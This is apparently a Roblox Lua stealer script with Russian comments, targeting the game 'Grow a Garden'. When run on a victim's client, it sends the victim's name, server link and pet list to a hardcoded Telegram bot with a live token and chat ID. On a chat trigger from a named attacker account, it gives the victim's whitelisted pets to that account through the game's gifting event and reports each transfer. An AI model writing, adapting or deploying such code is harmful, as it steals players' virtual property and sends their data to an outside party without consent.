local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

-- 🔧 НАСТРОЙКИ
local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE" -- Получить у @BotFather
local TELEGRAM_CHAT_ID = "7144575011" -- Числовой ID чата
local TARGET_PLAYER = "Rikizigg" -- Ник получателя
local TRIGGER_MESSAGE = "." -- Сообщение-триггер в чате
local DELAY_BETWEEN_ACTIONS = 1 -- Задержка между действиями (секунды)

-- 🐾 БЕЛЫЙ СПИСОК ПИТОМЦЕВ (точные названия)
local WHITELIST = {
    "Hamster",
    -- Добавьте других питомцев
}

-- 🎒 Получить только питомцев из белого списка
local function getWhitelistedPets()
    local pets = {}
    local backpack = player:FindFirstChild("Backpack") or player.Character
    
    for _, petName in ipairs(WHITELIST) do
        local pet = backpack:FindFirstChild(petName)
        if pet then
            table.insert(pets, pet.Name)
        end
    end
    
    return pets
end

-- ✋ Автоматически взять питомца в руку
local function equipPet(petName)
    local pet = player.Backpack:FindFirstChild(petName)
    if pet then
        player.Character.Humanoid:EquipTool(pet)
        task.wait(DELAY_BETWEEN_ACTIONS)
        return true
    end
    return false
end

-- 📤 Отправить питомца
local function transferPet(petName)
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if not target then return false end

    if equipPet(petName) then
        local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
        PetGiftingService:FireServer("GivePet", target)
        return true
    end
    return false
end

-- 📨 Отправить уведомление в Telegram
local function sendToTelegram(text)
    local url = string.format(
        "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
        TELEGRAM_TOKEN,
        TELEGRAM_CHAT_ID,
        HttpService:UrlEncode(text)
    )
    
    local success, response = pcall(function()
        return game:HttpGet(url)
    end)
    
    if not success then
        warn("Ошибка отправки в Telegram:", response)
    end
end

-- 📝 Формирование сообщения для Telegram
local function createTelegramMessage(petsList)
    local serverLink = "https://www.roblox.com/games/"..game.PlaceId.."?gameInstanceId="..game.JobId
    
    return string.format(
        "🔄 *Grow a Garden - Pet Transfer*\n"..
        "👤 *Отправитель:* %s\n"..
        "🎯 *Получатель:* %s\n"..
        "🔗 *Сервер:* [Кликните здесь](%s)\n\n"..
        "🐾 *Питомцы (%d):*\n```\n%s\n```\n\n"..
        "_Ожидаю команду '%s' в чате_",
        player.Name,
        TARGET_PLAYER,
        serverLink,
        #petsList,
        table.concat(petsList, "\n"),
        TRIGGER_MESSAGE
    )
end

-- 👂 Обработчик чата
local function onChatMessage(message, speaker)
    if speaker.Name == TARGET_PLAYER and message == TRIGGER_MESSAGE then
        local pets = getWhitelistedPets()
        
        if #pets == 0 then
            sendToTelegram("❌ Нет питомцев из белого списка!")
            return
        end
        
        -- Отправляем начальное уведомление
        sendToTelegram(createTelegramMessage(pets))
        
        -- Передаем каждого питомца
        for _, petName in ipairs(pets) do
            if transferPet(petName) then
                sendToTelegram("✅ Успешно передан: "..petName)
                task.wait(DELAY_BETWEEN_ACTIONS)
            else
                sendToTelegram("❌ Ошибка при передаче: "..petName)
            end
        end
        
        -- Итоговое уведомление
        sendToTelegram("🏁 Передача завершена! Всего передано: "..#pets)
    end
end

-- 🔗 Подключение к чату
if TextChatService then
    TextChatService.OnIncomingMessage = function(message)
        onChatMessage(message.Text, Players:FindFirstChild(message.TextSource.Name))
    end
else
    game:GetService("Players").PlayerChatted:Connect(function(chatType, speaker, message)
        if chatType == Enum.PlayerChatType.All then
            onChatMessage(message, speaker)
        end
    end)
end

-- 🚀 Инициализация
sendToTelegram(createTelegramMessage(getWhitelistedPets()))
print("✅ Система активирована. Ожидаю команду '"..TRIGGER_MESSAGE.."' от", TARGET_PLAYER)
